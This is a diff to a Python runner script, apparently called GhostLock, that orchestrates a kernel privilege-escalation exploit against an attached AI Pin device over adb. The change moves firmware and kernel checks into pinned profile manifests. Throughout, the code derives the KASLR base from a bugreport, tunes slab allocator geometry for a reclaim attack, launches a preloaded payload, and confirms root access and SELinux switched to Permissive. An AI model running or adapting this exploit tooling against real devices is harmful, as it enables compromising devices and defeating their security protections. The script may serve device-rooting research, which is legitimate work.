@@ -2,8 +2,8 @@
 """Fail-closed, production-equivalent GhostLock runner for an attached AI Pin.
 
 The runner requires an unprivileged adb shell, SELinux enforcing, a pinned
-serial/fingerprint/boot ID/payload hash, and a two-symbol KASLR derivation from
-the current boot's bugreport.  It never changes adbd privilege or tracefs.
+profile manifest/payload hash, and a two-symbol KASLR derivation from the
+current boot's bugreport.  It never changes adbd privilege or tracefs.
 """
 
 from __future__ import annotations
@@ -24,6 +24,19 @@ from dataclasses import asdict, dataclass
 from datetime import datetime, timezone
 from pathlib import Path
 
+
+ROOT = Path(__file__).resolve().parents[1]
+if str(ROOT) not in sys.path:
+    sys.path.insert(0, str(ROOT))
+
+from ghostlock_profile import (  # noqa: E402
+    AllocatorGeometry,
+    ProfileError,
+    TargetProfile,
+    load_profiles,
+    profile_by_id,
+    verify_payload_profile_binding,
+)
 from ghostlock_bugreport_kaslr import KaslrParseError, KaslrResult, parse_bugreport
 
 
@@ -31,14 +44,7 @@ DEFAULT_REMOTE_PAYLOAD = "/data/local/tmp/preload.so"
 DEFAULT_REMOTE_SU = "/data/local/tmp/su"
 DEFAULT_ATTEMPT_MARKER = "/data/local/tmp/.ghostlock-aipin-attempt"
 FORBIDDEN_ADB_SUBCOMMANDS = frozenset(("root", "unroot"))
-SUPPORTED_FINGERPRINT = (
-    "qti/atoll/atoll:12/SKQ1.230401.001/101.000470.45.20:user/release-keys"
-)
-SUPPORTED_KERNEL_MARKER = (
-    "4.14.190-perf #1 SMP PREEMPT Mon Nov 4 18:37:23 PST 2024"
-)
-SUPPORTED_SLOT = "_b"
-SUPPORTED_ABI = "arm64-v8a"
+PROFILES_ROOT = ROOT / "profiles"
 
 
 class RunnerError(RuntimeError):
@@ -56,6 +62,7 @@ class DeviceState:
     uptime_seconds: float
     fingerprint: str
     kernel: str
+    kernel_release: str
     slot: str
     abi: str
     payload_sha256: str
@@ -71,6 +78,19 @@ def sha256_file(path: Path) -> str:
         for chunk in iter(lambda: handle.read(1024 * 1024), b""):
             digest.update(chunk)
     return digest.hexdigest()
+
+
+def assert_payload_profile_binding(
+    path: Path,
+    profile: TargetProfile,
+    expected_payload_sha256: str,
+) -> None:
+    try:
+        verify_payload_profile_binding(
+            path, profile, expected_payload_sha256
+        )
+    except ProfileError as exc:
+        raise RunnerError(f"local {exc}") from exc
 
 
 class Adb:
@@ -146,6 +166,7 @@ def capture_state(adb: Adb, remote_payload: str) -> DeviceState:
         uptime_seconds=uptime_seconds,
         fingerprint=shell_value(adb, "getprop ro.build.fingerprint"),
         kernel=shell_value(adb, "uname -a"),
+        kernel_release=shell_value(adb, "uname -r"),
         slot=shell_value(adb, "getprop ro.boot.slot_suffix"),
         abi=shell_value(adb, "getprop ro.product.cpu.abi"),
         payload_sha256=remote_sha[0].lower(),
@@ -155,18 +176,10 @@ def capture_state(adb: Adb, remote_payload: str) -> DeviceState:
 def assert_production_equivalent(
     state: DeviceState,
     *,
-    expected_fingerprint: str,
+    profile: TargetProfile,
     expected_payload_sha256: str,
-    expected_slot: str | None,
-    expected_kernel_substring: str | None,
     expected_selinux: str = "Enforcing",
 ) -> None:
-    if expected_fingerprint != SUPPORTED_FINGERPRINT:
-        raise RunnerError("runner configuration requested an unsupported fingerprint")
-    if expected_slot != SUPPORTED_SLOT:
-        raise RunnerError("runner configuration requested an unsupported slot")
-    if expected_kernel_substring != SUPPORTED_KERNEL_MARKER:
-        raise RunnerError("runner configuration requested an unsupported kernel")
     if state.uid != "2000":
         raise RunnerError(
             f"adbd shell must be uid 2000; observed uid {state.uid}. "
@@ -178,29 +191,20 @@ def assert_production_equivalent(
         raise RunnerError(
             f"SELinux must be {expected_selinux}; observed {state.selinux!r}"
         )
-    if state.fingerprint != expected_fingerprint:
-        raise RunnerError(
-            "firmware fingerprint mismatch: "
-            f"expected {expected_fingerprint!r}, observed {state.fingerprint!r}"
-        )
     if state.payload_sha256 != expected_payload_sha256.lower():
         raise RunnerError(
             "remote payload hash mismatch: "
             f"expected {expected_payload_sha256}, observed {state.payload_sha256}"
         )
-    if expected_slot and state.slot != expected_slot:
-        raise RunnerError(
-            f"slot mismatch: expected {expected_slot!r}, observed {state.slot!r}"
-        )
-    if state.abi != SUPPORTED_ABI:
-        raise RunnerError(
-            f"ABI mismatch: expected {SUPPORTED_ABI!r}, observed {state.abi!r}"
-        )
-    if expected_kernel_substring and expected_kernel_substring not in state.kernel:
-        raise RunnerError(
-            f"kernel does not contain required marker {expected_kernel_substring!r}: "
-            f"{state.kernel}"
-        )
+    mismatches = profile.mismatches(
+        fingerprint=state.fingerprint,
+        kernel=state.kernel,
+        kernel_release=state.kernel_release,
+        slot=state.slot,
+        abi=state.abi,
+    )
+    if mismatches:
+        raise RunnerError("profile mismatch: " + "; ".join(mismatches))
 
 
 def assert_same_boot(
@@ -214,6 +218,7 @@ def assert_same_boot(
         "boot_epoch",
         "fingerprint",
         "kernel",
+        "kernel_release",
         "slot",
         "abi",
         "payload_sha256",
@@ -238,8 +243,14 @@ def assert_same_boot(
         )
 
 
-def assert_root_markers(log_text: str) -> None:
+def assert_root_markers(log_text: str, profile: TargetProfile) -> None:
     required = {
+        "profile identity": re.escape(
+            f"target kernel accepted profile={profile.profile_id} "
+            f"manifest_sha256={profile.manifest_sha256} "
+            f"image_sha256={profile.kernel_image_sha256} "
+            f"symbols_sha256={profile.symbols_sha256}"
+        ),
         "same-attempt reclaim capture": (
             r"perf reclaim gate result verified=1 .*free=1 alloc=1"
         ),
@@ -311,19 +322,15 @@ def build_exploit_argv(
     runtime_text_base: int,
     remote_payload: str,
     *,
-    mm_object_size: int = 880,
-    mm_slab_size: int = 896,
-    mm_order: int = 3,
-    mm_objects_per_slab: int = 36,
-    mm_cpu_partial: int = 13,
+    geometry: AllocatorGeometry,
 ) -> list[str]:
     return [
         "/system/bin/env",
-        f"AI_PIN_MM_OBJECT_SIZE={mm_object_size}",
-        f"AI_PIN_MM_SLAB_SIZE={mm_slab_size}",
-        f"AI_PIN_MM_ORDER={mm_order}",
-        f"AI_PIN_MM_OBJS_PER_SLAB={mm_objects_per_slab}",
-        f"AI_PIN_MM_CPU_PARTIAL={mm_cpu_partial}",
+        f"AI_PIN_MM_OBJECT_SIZE={geometry.object_size}",
+        f"AI_PIN_MM_SLAB_SIZE={geometry.slab_size}",
+        f"AI_PIN_MM_ORDER={geometry.order}",
+        f"AI_PIN_MM_OBJS_PER_SLAB={geometry.objects_per_slab}",
+        f"AI_PIN_MM_CPU_PARTIAL={geometry.cpu_partial}",
         "AI_PIN_PERF_RECLAIM_GATE=1",
         "AI_PIN_SLIDE_LEAK=2",
         f"AI_PIN_KASLR_BASE=0x{runtime_text_base:016x}",
@@ -406,17 +413,9 @@ def write_manifest(path: Path, manifest: dict[str, object]) -> None:
 def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--serial", required=True)
-    parser.add_argument(
-        "--expected-fingerprint", required=True, choices=(SUPPORTED_FINGERPRINT,)
-    )
-    parser.add_argument("--expected-slot", required=True, choices=(SUPPORTED_SLOT,))
-    parser.add_argument(
-        "--expected-kernel-substring",
-        required=True,
-        choices=(SUPPORTED_KERNEL_MARKER,),
-    )
+    parser.add_argument("--profile-id", required=True)
+    parser.add_argument("--profile-sha256", required=True)
     parser.add_argument("--expected-boot-id")
-    parser.add_argument("--symbols", type=Path, required=True)
     parser.add_argument("--bugreport", type=Path)
     parser.add_argument(
         "--retain-bugreport",
@@ -428,11 +427,6 @@ def main(argv: list[str] | None = None) -> int:
     parser.add_argument("--remote-payload", default=DEFAULT_REMOTE_PAYLOAD)
     parser.add_argument("--remote-su", default=DEFAULT_REMOTE_SU)
     parser.add_argument("--attempt-marker", default=DEFAULT_ATTEMPT_MARKER)
-    parser.add_argument("--mm-object-size", type=int, default=880)
-    parser.add_argument("--mm-slab-size", type=int, default=896)
-    parser.add_argument("--mm-order", type=int, default=3)
-    parser.add_argument("--mm-objects-per-slab", type=int, default=36)
-    parser.add_argument("--mm-cpu-partial", type=int, default=13)
     parser.add_argument("--timeout", type=int, default=3600)
     parser.add_argument("--output-dir", type=Path)
     parser.add_argument("--execute", action="store_true")
@@ -440,21 +434,29 @@ def main(argv: list[str] | None = None) -> int:
 
     if not re.fullmatch(r"[0-9a-fA-F]{64}", args.payload_sha256):
         parser.error("--payload-sha256 must be exactly 64 hexadecimal characters")
+    if not re.fullmatch(r"[0-9a-f]{64}", args.profile_sha256):
+        parser.error("--profile-sha256 must be exactly 64 lowercase hexadecimal characters")
     if args.timeout < 60 or args.bugreport_timeout < 60:
         parser.error("timeouts must be at least 60 seconds")
-    geometry = {
-        "object_size": args.mm_object_size,
-        "slab_size": args.mm_slab_size,
-        "order": args.mm_order,
-        "objects_per_slab": args.mm_objects_per_slab,
-        "cpu_partial": args.mm_cpu_partial,
-    }
-    if any(value <= 0 for value in geometry.values()):
-        parser.error("all mm geometry values must be positive")
-    if args.mm_object_size > args.mm_slab_size:
-        parser.error("--mm-object-size cannot exceed --mm-slab-size")
-    if args.mm_objects_per_slab * args.mm_slab_size > 4096 << args.mm_order:
-        parser.error("mm geometry does not fit in the declared slab order")
+    try:
+        profile = profile_by_id(load_profiles(PROFILES_ROOT), args.profile_id)
+    except ProfileError as exc:
+        parser.error(str(exc))
+    if profile.manifest_sha256 != args.profile_sha256:
+        parser.error(
+            "profile manifest hash mismatch: "
+            f"expected {args.profile_sha256}, observed {profile.manifest_sha256}"
+        )
+    geometry = profile.allocator_geometry
+    local_payload = (
+        ROOT / "source" / "build" / profile.project / "bin" / "preload.so"
+    )
+    try:
+        assert_payload_profile_binding(
+            local_payload, profile, args.payload_sha256
+        )
+    except RunnerError as exc:
+        parser.error(str(exc))
 
     timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
     output_dir = args.output_dir or Path(
@@ -467,9 +469,14 @@ def main(argv: list[str] | None = None) -> int:
         "started_at": utc_now(),
         "mode": "execute" if args.execute else "preflight-only",
         "serial": args.serial,
-        "symbols": str(args.symbols.resolve()),
-        "symbols_sha256": sha256_file(args.symbols),
-        "mm_geometry": geometry,
+        "profile_id": profile.profile_id,
+        "profile_manifest": str(profile.manifest_path),
+        "profile_sha256": profile.manifest_sha256,
+        "kernel_image_sha256": profile.kernel_image_sha256,
+        "local_payload": str(local_payload),
+        "symbols": str(profile.symbols_path),
+        "symbols_sha256": profile.symbols_sha256,
+        "mm_geometry": asdict(geometry),
         "output_dir": str(output_dir),
     }
 
@@ -479,10 +486,8 @@ def main(argv: list[str] | None = None) -> int:
         initial = capture_state(adb, args.remote_payload)
         assert_production_equivalent(
             initial,
-            expected_fingerprint=args.expected_fingerprint,
+            profile=profile,
             expected_payload_sha256=args.payload_sha256,
-            expected_slot=args.expected_slot,
-            expected_kernel_substring=args.expected_kernel_substring,
         )
         if args.expected_boot_id and initial.boot_id != args.expected_boot_id:
             raise RunnerError(
@@ -511,7 +516,7 @@ def main(argv: list[str] | None = None) -> int:
 
         kaslr = parse_bugreport(
             bugreport,
-            args.symbols,
+            profile.symbols_path,
             # Retail dumpstate omits linuxBootId.  A bugreport captured by this
             # runner is still boot-bound: capture_state() brackets dumpstate
             # and assert_same_boot() checks boot ID, boot epoch and uptime
@@ -519,7 +524,7 @@ def main(argv: list[str] | None = None) -> int:
             # stronger in-report boot-ID requirement.
             expected_boot_id=None if captured_in_this_run else initial.boot_id,
             expected_serial=args.serial,
-            expected_fingerprint=args.expected_fingerprint,
+            expected_fingerprint=profile.fingerprint,
         )
         manifest["bugreport_binding"] = (
             "synchronous-before-after-device-state"
@@ -541,10 +546,8 @@ def main(argv: list[str] | None = None) -> int:
         pinned = capture_state(adb, args.remote_payload)
         assert_production_equivalent(
             pinned,
-            expected_fingerprint=args.expected_fingerprint,
+            profile=profile,
             expected_payload_sha256=args.payload_sha256,
-            expected_slot=args.expected_slot,
-            expected_kernel_substring=args.expected_kernel_substring,
         )
         assert_same_boot(initial, pinned)
         manifest["pinned_state"] = asdict(pinned)
@@ -570,11 +573,7 @@ def main(argv: list[str] | None = None) -> int:
         exploit_argv = build_exploit_argv(
             kaslr.runtime_text_base,
             args.remote_payload,
-            mm_object_size=args.mm_object_size,
-            mm_slab_size=args.mm_slab_size,
-            mm_order=args.mm_order,
-            mm_objects_per_slab=args.mm_objects_per_slab,
-            mm_cpu_partial=args.mm_cpu_partial,
+            geometry=geometry,
         )
         remote_command = shlex.join(exploit_argv)
         host_command = ["adb", "-s", args.serial, "shell", remote_command]
@@ -597,17 +596,15 @@ def main(argv: list[str] | None = None) -> int:
 
         assert_production_equivalent(
             final_state,
-            expected_fingerprint=args.expected_fingerprint,
+            profile=profile,
             expected_payload_sha256=args.payload_sha256,
-            expected_slot=args.expected_slot,
-            expected_kernel_substring=args.expected_kernel_substring,
             expected_selinux="Permissive",
         )
 
         run_log_text = (output_dir / "run.log").read_text(
             encoding="utf-8", errors="replace"
         )
-        assert_root_markers(run_log_text)
+        assert_root_markers(run_log_text, profile)
 
         acceptance = adb.shell(
             f"{shlex.quote(args.remote_su)} -c id", timeout=30, check=False
